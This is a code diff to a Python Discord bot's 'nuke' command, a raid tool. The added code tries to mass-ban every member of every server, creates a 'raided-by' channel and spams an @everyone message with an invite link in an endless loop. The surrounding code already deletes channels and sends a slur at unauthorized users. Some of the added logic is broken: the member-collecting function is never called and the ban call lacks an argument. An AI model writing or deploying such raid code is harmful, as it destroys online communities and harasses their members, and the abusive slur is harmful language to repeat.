@@ -166,6 +166,14 @@ async def nuke_server_fr(ctx):
         await ctx.send(
             "LOL ONLY <@762152955382071316> can nuke THE ENTIRE SERVER ||(and why would he)||, get lost noob\n**YOU FUCKING RETARD**")
     else:
+
+        all_members_list = []
+
+        async def members(ctx):
+            for guild in bot.guilds:
+                for member in guild.members:
+                    all_members_list.append(member)
+
         async def nuke_channel_2(txt):
             if str(txt.author.id) != '762152955382071316':
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
@@ -187,11 +195,24 @@ async def nuke_server_fr(ctx):
                     None
 
         await nuke_channel_2(ctx)
+
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
+        async def ban(ctx, member: discord.User = None, reason=None):
+            await ctx.guild.ban(member, reason=reason)
+
+        for member in all_members_list:
+            try:
+                await ban(member=member)
+            except:
+                None
+            finally:
+                None
+
         while True:
-            await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux https://discord.gg/cdJvU4QpTG. EZ Noobs**')
+            await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
+                                  'https://discord.gg/cdJvU4QpTG. EZ Noobs**')
 
 
 bot.run(TOKEN)
